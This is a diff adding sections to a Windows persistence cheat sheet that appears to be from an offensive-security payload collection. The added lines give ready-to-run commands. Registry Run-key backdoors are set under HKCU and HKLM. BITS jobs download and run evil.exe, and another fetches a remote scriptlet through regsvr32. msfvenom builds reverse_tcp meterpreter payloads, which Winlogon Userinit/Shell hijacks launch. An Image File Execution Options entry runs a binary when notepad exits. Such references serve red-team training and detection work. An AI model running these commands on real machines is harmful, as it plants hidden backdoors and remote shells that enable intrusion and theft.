@@ -6,14 +6,17 @@
 * [Disable Windows Defender](#disable-windows-defender)
 * [Disable Windows Firewall](#disable-windows-firewall)
 * [Userland](#userland)
-    * [Registry](#registry)
+    * [Registry HKCU](#registry-hkcu)
     * [Startup](#startup)
     * [Scheduled Task](#scheduled-task)
+    * [BITS Jobs](#bits-jobs)
 * [Serviceland](#serviceland)
     * [IIS](#iis)
     * [Windows Service](#windows-service)
 * [Elevated](#elevated)
-    * [HKLM](#hklm)
+    * [Registry HKLM](#registry-hklm)
+        * [Winlogon Helper DLL](#)
+        * [GlobalFlag](#)
     * [Services](#services)
     * [Scheduled Task](#scheduled-task)
     * [Binary Replacement](#binary-replacement)
@@ -65,6 +68,15 @@ Value name:  Backdoor
 Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
 ```
 
+Using the command line 
+
+```powershell
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
+```
+
 Using SharPersist
 
 ```powershell
@@ -110,6 +122,23 @@ SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Som
 SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
 ```
 
+
+### BITS Jobs
+
+```powershell
+bitsadmin /create backdoor
+bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"
+
+# v1
+bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
+bitsadmin /SetMinRetryDelay "backdoor" 60
+bitsadmin /resume backdoor
+
+# v2 - exploit/multi/script/web_delivery
+bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
+bitsadmin /resume backdoor
+```
+
 ## Serviceland
 
 ### IIS
@@ -132,7 +161,7 @@ SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Som
 
 ## Elevated
 
-### HKLM
+### Registry HKLM
 
 Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\Software\Microsoft\Windows.
 
@@ -140,6 +169,41 @@ Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\Software\Micro
 Value name:  Backdoor
 Value data:  C:\Windows\Temp\backdoor.exe
 ```
+
+Using the command line 
+
+```powershell
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
+```
+
+#### Winlogon Helper DLL
+
+> Run executable during Windows logon
+
+```powershell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll
+
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
+```
+
+
+#### GlobalFlag
+
+> Run executable after notepad is killed
+
+```powershell
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
+```
+
 
 ### Services
 
@@ -175,6 +239,8 @@ PS C:\> Register-ScheduledTask Backdoor -InputObject $D
 | Narrator            | C:\Windows\System32\Narrator.exe      |
 | Display Switcher    | C:\Windows\System32\DisplaySwitch.exe |
 | App Switcher        | C:\Windows\System32\AtBroker.exe      |
+
+In Metasploit : `use post/windows/manage/sticky_keys`
 
 #### Binary Replacement on Windows 10+
 
@@ -218,3 +284,8 @@ Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administr
 * [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
 * [IIS Raid – Backdooring IIS Using Native Modules - 19/02/2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
 * [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
+* [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
+* [Persistence – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)
+* [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
+* [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
+* [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
